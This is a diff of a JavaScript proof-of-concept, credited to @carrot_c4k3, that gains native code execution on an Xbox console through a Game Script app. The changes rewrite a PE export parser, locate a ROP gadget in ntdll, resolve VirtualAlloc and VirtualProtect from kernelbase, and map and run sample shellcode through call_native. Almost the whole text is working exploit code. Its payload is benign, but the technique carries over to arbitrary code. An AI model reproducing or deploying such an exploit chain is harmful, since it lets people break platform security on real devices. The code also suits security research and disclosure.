@@ -1,7 +1,7 @@
 // native code exec PoC via Game Script - @carrot_c4k3 (exploits.forsale)
 // OS Version: 10.0.25398.4909 (xb_flt_2406zn.240612-1410)
 // Shell Version: 2406.0.2405.31002
-// Console id: 9f02182f.2c39fabe.e30e9dc8.946ed305.01
+// Console id: 9f02182f.2c39fabe.e30e9dc8.946ed305.01 
 
 // sample shellcode: mov rax, 0x1337; ret;
 let shellcode = [0x48, 0xC7, 0xC0, 0x37, 0x13, 0x00, 0x00, 0xC3];
@@ -237,31 +237,49 @@ function get_dll_exports(base_addr) {
     var magic_static = [0x4D, 0x5A];
     var magic_read = [0, 0];
     read_buf(base_addr, magic_read);
-
     if (!array_compare(magic_static, magic_read)) {
-        printConsole("Magic is invalid!\n");
+        printConsole("[-] Not a valid PE file\n");
         return res;
     }
 
-    var e_lfanew = read32(base_addr + 0x3c);
-    var exports_addr = base_addr + read32(base_addr + e_lfanew + 0x70 + 0x18);
+    var e_lfanew = read32(base_addr + 0x3C);
+    var nt_header = base_addr + e_lfanew;
+    var export_dir_rva = read32(nt_header + 0x88);
+    var export_dir_addr = base_addr + export_dir_rva;
 
-    var num_funcs = read32(exports_addr + 0x14);
-    var num_names = read32(exports_addr + 0x18);
+    var num_of_funcs = read32(export_dir_addr + 0x14);
+    var func_addr_array_rva = read32(export_dir_addr + 0x1C);
+    var name_addr_array_rva = read32(export_dir_addr + 0x20);
+    var ord_addr_array_rva = read32(export_dir_addr + 0x24);
 
-    var funcs_addr = base_addr + read32(exports_addr + 0x1c);
-    var names_addr = base_addr + read32(exports_addr + 0x20);
-    var ords_addr = base_addr + read32(exports_addr + 0x24);
+    var func_addr_array = base_addr + func_addr_array_rva;
+    var name_addr_array = base_addr + name_addr_array_rva;
+    var ord_addr_array = base_addr + ord_addr_array_rva;
 
-    for (var i = 0; i < num_names; i++) {
-        var name_addr = base_addr + read32(names_addr + (4 * i));
-        var name_str = pointerGetSubstring(0, name_addr, 0x20);
-        var ordinal = read16(ords_addr + (2 * i));
-        var func_addr = base_addr + read32(funcs_addr + (4 * ordinal));
-        res[name_str] = func_addr;
+    for (var i = 0; i < num_of_funcs; i++) {
+        var func_name_rva = read32(name_addr_array + (i * 4));
+        var func_name_addr = base_addr + func_name_rva;
+        var func_name = read_c_string(func_name_addr);
+
+        var func_ord = read16(ord_addr_array + (i * 2));
+        var func_rva = read32(func_addr_array + (func_ord * 4));
+        var func_addr = base_addr + func_rva;
+
+        res[func_name] = func_addr;
     }
 
     return res;
+}
+
+function read_c_string(addr) {
+    var str = "";
+    var c = read8(addr);
+    while (c !== 0) {
+        str += String.fromCharCode(c);
+        addr++;
+        c = read8(addr);
+    }
+    return str;
 }
 
 var VirtualAlloc_ptr = 0;
@@ -297,52 +315,16 @@ longjmp_ptr = find_bytes(ntdll_base, 0x217000, longjmp_bytes, tmp_bytes);
 
 // find one of our gadgets in ntdll
 var gadget_bytes = [0x5A, 0x59, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x41, 0x5B, 0xC3];
-tmp_bytes = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0];
+tmp_bytes = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0];
 gadget_ptr = find_bytes(ntdll_base, 0x217000, gadget_bytes, tmp_bytes);
 
-// get the ntdll & kernelbase exports
-var ntdll_exports = get_dll_exports(ntdll_base);
+// get the export addresses for VirtualAlloc and VirtualProtect
 var kernelbase_exports = get_dll_exports(kernelbase_base);
-
-VirtualAlloc_ptr = ntdll_exports["VirtualAlloc"];
+VirtualAlloc_ptr = kernelbase_exports["VirtualAlloc"];
 VirtualProtect_ptr = kernelbase_exports["VirtualProtect"];
 
-if (VirtualAlloc_ptr === 0 || VirtualProtect_ptr === 0) {
-    printConsole("Failed to locate VirtualAlloc or VirtualProtect functions!\n");
-} else {
-    // Map and execute the shellcode
-    var shellcode_addr = map_code(shellcode);
-    call_native(shellcode_addr, 0, 0, 0, 0);
-    printConsole("Shellcode executed.\n");
-}
+// map and execute the shellcode
+var shellcode_addr = map_code(shellcode);
+var ret_val = call_native(shellcode_addr, 0, 0, 0, 0);
 
-printConsole("PoC completed.\n");
-
-// Additional functionality or cleanup if needed
-// Example: Cleanup allocated resources or provide further diagnostics
-
-function cleanup_resources() {
-    // Assuming we need to clean up some global arrays or other resources
-    globalArrayDelete("call");
-    globalArrayDelete("vtable");
-    globalArrayDelete("stack");
-    globalArrayDelete("jctx");
-}
-
-cleanup_resources();
-printConsole("Resources cleaned up.\n");
-
-// Optionally, you can add some debugging or further diagnostics
-function print_diagnostics() {
-    printConsole("OS Version: 10.0.25398.4909 (xb_flt_2406zn.240612-1410)\n");
-    printConsole("Shell Version: 2406.0.2405.31002\n");
-    printConsole("Console ID: 9f02182f.2c39fabe.e30e9dc8.946ed305.01\n");
-}
-
-print_diagnostics();
-printConsole("Diagnostics printed.\n");
-
-// If there's any other specific functionality you want to implement, add it here
-// For example, additional checks, validation, or specific operations
-
-printConsole("Script execution completed.\n");
+printConsole("[+] Shellcode executed, returned: " + num_to_hex64(ret_val) + "\n");
